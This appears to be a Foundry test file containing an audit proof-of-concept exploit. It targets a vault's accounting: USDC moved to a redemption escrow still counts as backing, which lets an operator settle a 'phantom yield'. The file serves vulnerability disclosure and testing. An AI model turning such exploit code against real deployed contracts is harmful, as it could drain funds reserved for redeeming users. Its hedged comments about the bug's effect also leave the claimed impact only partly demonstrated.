// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "test/simulator/SimulatorBase.sol";
import "../src/core/MonetrixAccountant.sol";
import "../src/core/MonetrixVault.sol";
import "../src/core/RedeemEscrow.sol";
import "../src/core/YieldEscrow.sol";
import "../src/tokens/USDM.sol";

contract AuditAgentPoC is SimulatorBase {
    address attacker = address(0xA11CE);

    function setUp() public {
        console.log("=== setUp: starting ===");
        setUpSimulator();
        console.log("=== setUp: finished ===");
    }

    function test_exploit() public {
        console.log("=== test_exploit: starting ===");
        console.log("Attacker address:", attacker);
        console.log("Operator address:", operator);
        console.log("Initial block.timestamp:", block.timestamp);

        // ATTACK TIMELINE:
        // 1. [Setup] Deposit 1,000,000 USDC to mint USDM and establish baseline backing.
        console.log("--- Step 1: Before _deposit ---");
        console.log("Attempting to deposit 1,000,000e6 for attacker");
        _deposit(attacker, 1_000_000e6);
        console.log("--- Step 1: After _deposit ---");

        int256 backingBefore = accountant.totalBackingSigned();
        int256 surplusBefore = accountant.distributableSurplus();
        console.log("Step 1: backingBefore =", uint256(backingBefore));
        console.log("Step 1: surplusBefore =", uint256(surplusBefore));

        // 2. [T=0] Attacker requests redemption of 500,000 USDM, creating a liability.
        console.log("--- Step 2: Before requestRedeem ---");
        vm.startPrank(attacker);
        console.log("Approving vault to spend 500,000e6 USDM");
        usdm.approve(address(vault), 500_000e6);
        console.log("Calling vault.requestRedeem(500,000e6)");
        vault.requestRedeem(500_000e6);
        vm.stopPrank();
        console.log("--- Step 2: After requestRedeem ---");

        // 3. [T=0] Operator funds the RedeemEscrow, moving 500,000 USDC out of the active vault.
        console.log("--- Step 3: Before fundRedemptions ---");
        vm.prank(operator);
        console.log("Calling vault.fundRedemptions(500,000e6) as operator");
        vault.fundRedemptions(500_000e6);
        console.log("--- Step 3: After fundRedemptions ---");

        uint256 escrowBalance = redeemEscrow.balance();
        console.log("Step 3: RedeemEscrow balance =", escrowBalance);

        // 4. [T=0] Verify the asymmetry: RedeemEscrow USDC is still counted in totalBackingSigned
        // despite being segregated for redemptions, inflating the backing figure.
        console.log("--- Step 4: Checking backing asymmetry ---");
        int256 backingAfter = accountant.totalBackingSigned();
        console.log("Step 4: backingAfter =", uint256(backingAfter));

        // The backing should have dropped by 500k since those funds are no longer backing outstanding USDM,
        // but due to the bug, it remains artificially high (or drops less than expected).
        console.log("Asserting backingAfter > backingBefore - 500,000e6");
        assertGt(uint256(backingAfter), uint256(backingBefore) - 500_000e6, "Backing is artificially inflated by RedeemEscrow USDC");

        // 5. [T=1 day] Attacker/Operator calls settleDailyPnL via vault.settle() with a proposed yield
        // that exceeds the actual economic surplus but is approved due to the inflated backing.
        console.log("--- Step 5: Before warp and settle ---");
        vm.warp(block.timestamp + 1 days);
        console.log("Warped to block.timestamp:", block.timestamp);

        uint256 phantomYield = 100_000e6; // 100k USDC yield that doesn't actually exist
        console.log("Phantom yield to settle:", phantomYield);

        uint256 yieldEscrowBefore = yieldEscrow.balance();
        console.log("Step 5: yieldEscrowBefore =", yieldEscrowBefore);

        vm.prank(operator);
        console.log("Calling vault.settle(phantomYield) as operator");
        vault.settle(phantomYield);
        console.log("--- Step 5: After settle ---");

        // 6. [Assert] Verify that the phantom yield was successfully extracted and distributed,
        // draining funds that should have been reserved for the redeeming user.
        console.log("--- Step 6: Final Assertions ---");
        uint256 yieldEscrowAfter = yieldEscrow.balance();
        console.log("Step 6: yieldEscrowAfter =", yieldEscrowAfter);

        console.log("Asserting yieldEscrowAfter > yieldEscrowBefore");
        assertGt(yieldEscrowAfter, yieldEscrowBefore, "Phantom yield was extracted from RedeemEscrow-backed funds");

        console.log("=== test_exploit: finished ===");
    }
}
